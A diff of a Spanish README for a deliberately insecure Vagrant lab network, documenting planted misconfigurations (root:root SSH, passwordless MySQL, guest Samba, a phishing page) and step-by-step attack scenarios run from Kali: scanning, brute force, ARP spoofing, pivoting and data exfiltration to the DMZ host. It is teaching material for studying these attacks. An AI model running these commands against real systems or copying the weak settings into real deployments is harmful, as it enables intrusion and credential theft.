@@ -1,13 +1,11 @@
 # Bloque 4 — Insecure Network Lab
 
----
-
 Infraestructura de red intencionadamente insegura para demostrar ataques reales sobre configuraciones incorrectas comunes en entornos corporativos.  
 Debe usarse exclusivamente en este entorno aislado.
 
 ---
 
-# Índice
+## Índice
 
 1. [Descripción](#descripción)
 2. [Topología](#topología)
@@ -15,12 +13,14 @@ Debe usarse exclusivamente en este entorno aislado.
 4. [Malas prácticas documentadas](#malas-prácticas-documentadas)
 5. [Requisitos](#requisitos)
 6. [Despliegue](#despliegue)
-7. [Escenarios de ataque](#escenarios-de-ataque)
-8. [Advertencia legal](#advertencia-legal)
+7. [Acceso al escritorio gráfico de Kali](#acceso-al-escritorio-gráfico-de-kali)
+8. [Escenarios de ataque](#escenarios-de-ataque)
+9. [Solución de problemas](#solución-de-problemas)
+10. [Advertencia legal](#advertencia-legal)
 
 ---
 
-# Descripción
+## Descripción
 
 Este bloque simula una red corporativa con errores de configuración reales y frecuentes. El objetivo es poder reproducir y comprender los ataques descritos en el capítulo 7 de la memoria, observando en un entorno controlado las consecuencias de cada mala práctica.
 
@@ -29,7 +29,7 @@ El laboratorio se compone de cuatro máquinas virtuales orquestadas con Vagrant 
 Todas las redes son internas (`intnet`) y no tienen salida real a internet durante las prácticas.  
 La interfaz NAT de Vagrant solo se usa durante el aprovisionamiento inicial.
 
-## Redes definidas
+### Redes definidas
 
 | Red | Rango | Descripción |
 |---|---|---|
@@ -39,26 +39,26 @@ La interfaz NAT de Vagrant solo se usa durante el aprovisionamiento inicial.
 
 ---
 
-# Topología
+## Topología
 
-> Pendiente de hacer.
 
----
-
-# Máquinas virtuales
-
-| VM | Box | IP | Red | RAM | Rol |
-|---|---|---|---|---|---|
-| `external-kali` | `kalilinux/rolling` | `100.70.9.10` | `net-externa` | 1024 MB | Atacante externo |
-| `firewall` | `ubuntu/jammy64` | `100.70.9.1` / `192.168.57.1` / `192.168.58.1` | Todas | 512 MB | Firewall vulnerable |
-| `dmz-server` | `ubuntu/jammy64` | `192.168.57.10` | `net-dmz` | 512 MB | Apache + FTP + Telnet |
-| `internal-server` | `ubuntu/jammy64` | `192.168.58.10` | `net-interna` | 2048 MB | MySQL + Samba + SSH |
 
 ---
 
-# Malas prácticas documentadas
+## Máquinas virtuales
 
-# Firewall (`firewall`)
+| VM | Box | IP | Red | RAM | vCPUs | Rol |
+|---|---|---|---|---|---|---|
+| `external-kali` | `kalilinux/rolling` | `100.70.9.10` | `net-externa` | 2048 MB | 1 | Atacante externo |
+| `firewall` | `ubuntu/jammy64` | `100.70.9.1` / `192.168.57.1` / `192.168.58.1` | Todas | 512 MB | 1 | Firewall vulnerable |
+| `dmz-server` | `ubuntu/jammy64` | `192.168.57.10` | `net-dmz` | 512 MB | 1 | Apache + FTP + Telnet |
+| `internal-server` | `ubuntu/jammy64` | `192.168.58.10` | `net-interna` | 2048 MB | 1 | MySQL + Samba + SSH |
+
+---
+
+## Malas prácticas documentadas
+
+### Firewall (`firewall`)
 
 - Política `FORWARD DROP` por defecto pero con reglas explícitas que permiten todo el tráfico entre cualquier segmento.
 - `ip_forward` habilitado sin restricción de rutas.
@@ -70,72 +70,68 @@ La interfaz NAT de Vagrant solo se usa durante el aprovisionamiento inicial.
   sin limitación de puertos.
 - Sin logging de tráfico.
 - `rp_filter` desactivado.
-- `accept_source_route` y `accept_redirects` habilitados.
+- `accept_source_route` y `accept_redirects` habilitados (hasta donde el kernel lo permite).
 - Sin NAT.
 
----
-
-# DMZ (`dmz-server`)
+### DMZ (`dmz-server`)
 
 - Apache con:
   - `ServerTokens Full`
   - `ServerSignature On`
 - Directory listing habilitado en `/var/www/html`.
 - `phpinfo()` accesible públicamente en `/info.php`.
-- Panel `/admin/` sin autenticación.
-- Directorio `/backup/` con:
+- Panel `/admin/` sin autenticación que muestra credenciales de la base de datos interna.
+- Directorio `/backup/` accesible públicamente con:
   - `credentials.txt`
   - `network.txt`
 - Sitio de phishing en:
   - `http://192.168.57.10:8080`
 - FTP anónimo habilitado (`vsftpd`) con permisos de escritura.
 - Telnet activo en puerto `23`.
-- Usuario:
+- Usuario débil:
   - `ftpoperator:ftpoperator`
 - Sin firewall local (`ufw` desactivado).
 - Rutas estáticas hacia `internal-server`.
 
----
-
-# Servidor interno (`internal-server`)
+### Servidor interno (`internal-server`)
 
 - SSH con:
   - `PermitRootLogin yes`
   - `PasswordAuthentication yes`
-  - Sin límite de intentos
+  - Banner que expone versión del sistema
 - Credenciales root:
   - `root:root`
-- Banner SSH expone versión del sistema.
 - MySQL:
   - `root` sin contraseña
-  - `bind-address 0.0.0.0`
+  - `bind-address 0.0.0.0` (accesible desde toda la red)
 - Base de datos `corporativedb` con:
-  - credenciales en texto plano
-  - inventario completo de red
+  - Credenciales en texto plano (`user_credentials`)
+  - Inventario completo de red (`network_inventory`)
+  - Datos personales de empleados (`employees`)
 - Samba:
-  - recurso `confidential`
-  - acceso invitado sin autenticación
+  - Recurso `confidential` accesible como invitado sin autenticación
+  - Permisos de escritura (777)
 - Archivo:
   - `/srv/samba/confidential/passwords.txt`
-- Sin firewall local.
+- Sin firewall local (`ufw` desactivado).
 - Rutas estáticas hacia DMZ y red externa.
 
 ---
 
-# Requisitos
+## Requisitos
 
 | Requisito | Valor |
 |---|---|
 | VirtualBox | >= 7.0 |
 | Vagrant | >= 2.4 |
-| Espacio en disco | ~15 GB |
-| RAM mínima | 3 GB |
+| Espacio en disco | ~35 GB libres |
+| RAM mínima | 4 GB |
 | RAM recomendada | 8 GB |
 | Internet | Solo durante el primer `vagrant up` |
 
 ---
 
-# Despliegue
+## Despliegue
 
 ```bash
 # Entrar al laboratorio
@@ -159,340 +155,332 @@ vagrant halt
 
 # Destruir laboratorio
 vagrant destroy -f
-```
 
-## Tiempos estimados
+### Tiempos estimados
 
 | Acción | Tiempo |
 |---|---|
-| Primera ejecución | 10-20 min |
-| Ejecuciones posteriores | 3-10 min |
-| Reinicio de VMs | 5-10 min |
+| Primera ejecución | 15-30 min |
+| Ejecuciones posteriores | 2-5 min |
+| Reinicio de VMs | 3-5 min |
 
-> Nota: las VMs usan `box_check_update = false`.
+> **Nota:** Las VMs usan `box_check_update = false`. Si tienes problemas de DNS durante el aprovisionamiento, consulta la sección [Solución de problemas](#solución-de-problemas).
 
 ---
 
-# Escenarios de ataque
+## Acceso al escritorio gráfico de Kali
 
-Todos los ataques se ejecutan desde `external-kali`.
+`external-kali` incluye un entorno de escritorio XFCE accesible mediante noVNC desde cualquier navegador.
+
+### Requisitos previos
+
+Asegúrate de que el puerto 8081 del servidor es accesible desde tu equipo:
 
 ```bash
+# En el servidor
+sudo ufw allow from 192.168.1.0/24 to any port 8081 proto tcp
+Conexión directa
+Averigua la IP de tu servidor en la red local:
+
+bash
+ip addr show | grep "192.168.1"
+Abre en tu navegador:
+
+text
+http://<IP_DEL_SERVIDOR>:8081/vnc.html
+Pulsa "Connect" (no hay contraseña).
+
+Alternativa segura: túnel SSH
+Desde tu equipo (PowerShell o terminal):
+
+bash
+ssh -L 8081:localhost:8081 mangoadmin@<IP_DEL_SERVIDOR>
+Luego abre en el navegador:
+
+text
+http://localhost:8081/vnc.html
+Escenarios de ataque
+Todos los ataques se ejecutan desde external-kali.
+
+bash
 vagrant ssh external-kali
-```
-
----
-
-# 1. Reconocimiento de red
-
-## Escaneo de servicios
-
-```bash
-# Escaneo rápido
+1. Reconocimiento de red
+Escaneo de servicios
+bash
+# Escaneo rápido de la DMZ
 nmap 192.168.57.10
 
-# Escaneo completo
+# Escaneo completo de la red interna
 nmap -sV -sC -O -p- -T4 192.168.58.10
+
+# Descubrimiento de hosts en la red interna
+nmap -sn 192.168.58.0/24
 
 # Enumeración SMB
 enum4linux 192.168.58.10
-```
-
-## Descubrimiento ARP desde la DMZ
-
-```bash
-# Acceso Telnet
+Descubrimiento ARP desde la DMZ
+bash
+# Acceso Telnet al dmz-server
 telnet 192.168.57.10
 # Usuario: ftpoperator
 # Password: ftpoperator
-```
 
-Una vez dentro de `dmz-server`, se puede escanear la red interna utilizando
-`nmap -sn` (ping sweep), ya que el firewall enruta el tráfico pero no filtra
-ICMP:
-```bash
+# Una vez dentro del dmz-server, escanear la red interna
 nmap -sn 192.168.58.0/24
-```
+Qué demuestra:
 
-### Qué demuestra
+El firewall actúa como router sin filtrado real
 
-- El firewall actúa como router sin filtrado real.
-- El atacante obtiene:
-  - versiones exactas
-  - servicios
-  - hosts internos
-- Facilita explotación de CVEs conocidos.
+El atacante obtiene versiones exactas, servicios y hosts internos
 
----
+Facilita la explotación de CVEs conocidos
 
-# 2. Acceso a la DMZ
-
-# 2.1 Exfiltración vía HTTP
-
-```bash
-# Credenciales expuestas
+2. Acceso a la DMZ
+2.1 Exfiltración vía HTTP
+bash
+# Credenciales expuestas en directorio backup
 curl http://192.168.57.10/backup/credentials.txt
 
-# Mapa de red
+# Mapa de red expuesto
 curl http://192.168.57.10/backup/network.txt
 
-# phpinfo()
+# Información del sistema (phpinfo)
 curl http://192.168.57.10/info.php
 
-# Panel admin
+# Panel admin que muestra credenciales de la BD interna
 curl http://192.168.57.10/admin/
-```
+Qué demuestra:
 
-### Qué demuestra
+Directory listing habilitado
 
-- Directory listing + `ServerTokens Full`
-- Exposición de:
-  - credenciales
-  - estructura de red
-  - configuración del sistema
+ServerTokens Full expone versión del servidor
 
----
+Exposición de credenciales, estructura de red y configuración del sistema
 
-# 2.2 FTP anónimo
-
-```bash
+2.2 FTP anónimo
+bash
 ftp 192.168.57.10
 # Usuario: anonymous
-# Password: 
+# Password: [vacío]
 
 ftp> ls
 ftp> cd public
 ftp> get readme.txt
 ftp> get config_backup.txt
 ftp> exit
-```
 
-### Qué demuestra
+# Ver los archivos descargados
+cat config_backup.txt
+Qué demuestra:
 
-`config_backup.txt` contiene:
+config_backup.txt contiene credenciales MySQL y la IP del servidor interno.
 
-- Credenciales MySQL
-- IP del servidor interno
-
----
-
-# 2.3 Telnet — credenciales en claro
-
-```bash
+2.3 Telnet — credenciales en claro
+bash
 telnet 192.168.57.10
 # Login: ftpoperator
 # Password: ftpoperator
-```
+Qué demuestra:
 
-### Qué demuestra
+Las credenciales viajan sin cifrar y pueden capturarse con Wireshark/tcpdump.
 
-Las credenciales viajan sin cifrar y pueden capturarse fácilmente.
-
----
-
-# 2.4 Sitio de phishing
-
-```bash
-# Acceso al phishing
+2.4 Sitio de phishing
+bash
+# Acceso a la página de phishing (puerto 8080)
 curl http://192.168.57.10:8080
 
-# Envío de credenciales
-curl -X POST http://192.168.57.10:8080/capture.php -d "username=admin&password=Password123!";
+# Envío simulado de credenciales
+curl -X POST http://192.168.57.10:8080/capture.php \
+  -d "username=admin&password=Password123!"
 
-# Recuperar credenciales
+# Recuperar credenciales capturadas desde el dmz-server
 ssh ftpoperator@192.168.57.10
 cat /var/log/phishing.log
-```
+Qué demuestra:
 
-### Qué demuestra
+Captura de credenciales internas mediante phishing
 
-- Captura de credenciales internas.
-- Falta de segmentación de red.
+Si se usa el escritorio gráfico de Kali con Firefox, la página es visualmente idéntica a GitHub
 
----
-
-# 3. Acceso a la red interna
-
-# 3.1 Fuerza bruta SSH
-
-```bash
-# Fuerza bruta
+3. Acceso a la red interna
+3.1 Fuerza bruta SSH
+bash
+# Verificar credenciales débiles
 hydra -l root -p root ssh://192.168.58.10
 
-# Acceso SSH
+# Acceso SSH directo
 ssh root@192.168.58.10
-```
+Qué demuestra:
 
-### Qué demuestra
+Credenciales débiles (root:root)
 
-- Credenciales débiles
-- SSH sin protección
-- Firewall permisivo
+SSH con PermitRootLogin yes y PasswordAuthentication yes
 
----
-
-# 3.2 MySQL sin contraseña
-
-## Acceso directo
-
-```bash
+3.2 MySQL sin contraseña
+bash
+# Acceso directo desde Kali
 mysql -h 192.168.58.10 -u root --skip-ssl
 
 mysql> USE corporativedb;
 mysql> SELECT * FROM user_credentials;
 mysql> SELECT * FROM network_inventory;
 mysql> SELECT * FROM employees;
-```
-
-## Pivoting desde la DMZ
-
-```bash
+mysql> EXIT;
+bash
+# Pivoting desde la DMZ
 telnet 192.168.57.10
+# Login: ftpoperator / ftpoperator
 
 mysql -h 192.168.58.10 -u root
 
 mysql> USE corporativedb;
 mysql> SELECT * FROM user_credentials;
-```
+Qué demuestra:
 
-### Qué demuestra
+MySQL accesible sin credenciales desde fuera de la red interna
 
-- No existe segmentación real.
-- Comprometer la DMZ implica acceso interno.
+Comprometer la DMZ equivale a acceder a la base de datos corporativa
 
----
+3.3 Samba anónimo
+bash
+# Listar recursos compartidos
+smbclient -L //192.168.58.10 -N
 
-# 3.3 Samba anónimo
-
-## Desde Kali
-
-```bash
+# Acceder al recurso confidential
 smbclient //192.168.58.10/confidential -N
 
 smb: \> ls
 smb: \> get passwords.txt
 smb: \> exit
 
+# Ver credenciales obtenidas
 cat passwords.txt
-```
+Qué demuestra:
 
-## Desde la DMZ
+passwords.txt contiene todas las credenciales del sistema:
 
-```bash
-smbclient //192.168.58.10/confidential -N
+admin / admin123
 
-smb: \> get passwords.txt
-smb: \> exit
-```
+root / root
 
-### Qué demuestra
+ftpoperator / ftpoperator
 
-`passwords.txt` contiene:
+backup / backup
 
-- `admin/admin123`
-- `root/root`
-- `ftpoperator/ftpoperator`
-
----
-
-# 4. ARP Spoofing y captura de tráfico
-
-```bash
-# Habilitar forwarding
+4. ARP Spoofing y captura de tráfico
+bash
+# Habilitar forwarding (necesario para MITM)
 sudo sysctl -w net.ipv4.ip_forward=1
 
-# ARP spoofing
+# ARP spoofing contra dmz-server y firewall
 sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
 sudo arpspoof -i eth1 -t 192.168.57.1 192.168.57.10 &
 
-# Captura Telnet
+# Capturar tráfico Telnet (credenciales en texto claro)
 sudo tcpdump -i eth1 -A -s0 port 23
-```
+En otra terminal (dentro o fuera de Kali):
 
-En otra terminal:
-
-```bash
+bash
 telnet 192.168.57.10
-```
-
 Detener ataque:
 
-```bash
+bash
 sudo killall arpspoof tcpdump
 sudo sysctl -w net.ipv4.ip_forward=0
-```
+Qué demuestra:
 
-### Qué demuestra
+Telnet transmite credenciales sin cifrar
 
-- Telnet y FTP transmiten credenciales sin cifrar.
-- No existe protección ARP (`ARP inspection`).
+No existe protección ARP (ARP inspection)
 
----
-
-# 5. Pivoting DMZ → red interna
-
-```bash
-# Acceso DMZ
+5. Pivoting DMZ → red interna
+bash
+# Acceso a la DMZ vía SSH
 ssh ftpoperator@192.168.57.10
+
+# Dentro del dmz-server:
 
 # Acceso MySQL interno
 mysql -h 192.168.58.10 -u root
-
 mysql> SELECT * FROM corporativedb.user_credentials;
 
-# Samba
+# Acceso Samba interno
 smbclient //192.168.58.10/confidential -N
 
-# SSH interno
+# Acceso SSH al servidor interno
 ssh root@192.168.58.10
-```
+Qué demuestra:
 
-### Qué demuestra
+Comprometer la DMZ equivale a comprometer toda la red interna gracias a:
 
-Comprometer la DMZ equivale a comprometer toda la red interna.
+Firewall sin filtrado entre segmentos
 
----
+Credenciales reutilizadas y almacenadas en texto plano
 
-# 6. Exfiltración de datos
+6. Exfiltración de datos
+bash
+# Desde internal-server (tras acceder vía SSH):
 
-```bash
-# Dump MySQL
+# Dump completo de MySQL
 mysqldump -u root corporativedb > /tmp/corporativedb.sql
 
-# Comprimir Samba
+# Comprimir recurso Samba
 tar -czf /tmp/confidential.tar.gz /srv/samba/confidential/
 
-# Exfiltración
-scp /tmp/corporativedb.sql \
-  vagrant@192.168.57.10:/home/vagrant/lab/captures/
+# Exfiltrar a la DMZ
+scp /tmp/corporativedb.sql ftpoperator@192.168.57.10:/tmp/
+scp /tmp/confidential.tar.gz ftpoperator@192.168.57.10:/tmp/
+Qué demuestra:
 
-scp /tmp/confidential.tar.gz \
-  vagrant@192.168.57.10:/home/vagrant/lab/captures/
-```
+Ausencia de monitorización (no hay logs de firewall)
 
-### Qué demuestra
+Ausencia de segmentación real
 
-- Ausencia de monitorización
-- Ausencia de segmentación
-- Exfiltración sin detección
+Exfiltración sin detección
 
----
+Solución de problemas
+Error: "The box failed to unpackage properly... No space left on device"
+El disco del servidor está lleno. Libera espacio con:
 
-# Advertencia legal
+bash
+sudo apt clean
+sudo apt autoremove --purge -y
+sudo journalctl --vacuum-size=200M
+Error: "Could not resolve host: vagrantcloud.com"
+Tu servidor tiene problemas de resolución DNS para los dominios de HashiCorp. Solución en el servidor:
 
+bash
+sudo nano /etc/hosts
+# Añadir al final del archivo:
+52.0.5.91 vagrantcloud.com app.vagrantup.com
+Error: "Failed to connect to server" en noVNC
+Entra en external-kali y ejecuta:
+
+bash
+sudo systemctl restart lightdm
+sleep 5
+sudo systemctl restart x11vnc
+sudo systemctl restart novnc
+El script de aprovisionamiento se queda colgado
+Los scripts fuerzan el DNS de Cloudflare (1.1.1.1) al inicio para evitar problemas de resolución. Si aún así se cuelga, verifica que la VM tiene acceso a internet por NAT durante el provision.
+
+Error de sintaxis en internal-server/setup.sh
+Asegúrate de que los heredocs (<< 'SQL', << 'EOF', etc.) no tengan espacios delante del delimitador de cierre. Debe estar al principio de la línea.
+
+Las VMs no se comunican entre sí
+Verifica que el firewall tiene ip_forward habilitado:
+
+bash
+vagrant ssh firewall
+cat /proc/sys/net/ipv4/ip_forward  # Debe devolver 1
+Advertencia legal
 ⚠️ Este laboratorio contiene configuraciones deliberadamente inseguras.
 
-## Restricciones
+Restricciones
+Uso exclusivamente educativo
 
-- Uso exclusivamente educativo.
-- Ejecutar únicamente en entornos aislados.
-- No conectar a redes corporativas reales.
-- No desplegar en producción.
+Ejecutar únicamente en entornos aislados
 
-## Consideraciones
+No conectar a redes corporativas reales
 
-- Todas las credenciales y datos son ficticios.
-- Las IPs no deben solaparse con redes reales.
-- El laboratorio está diseñado para funcionar sin acceso a internet durante las prácticas.
-
----
+No desplegar en producción
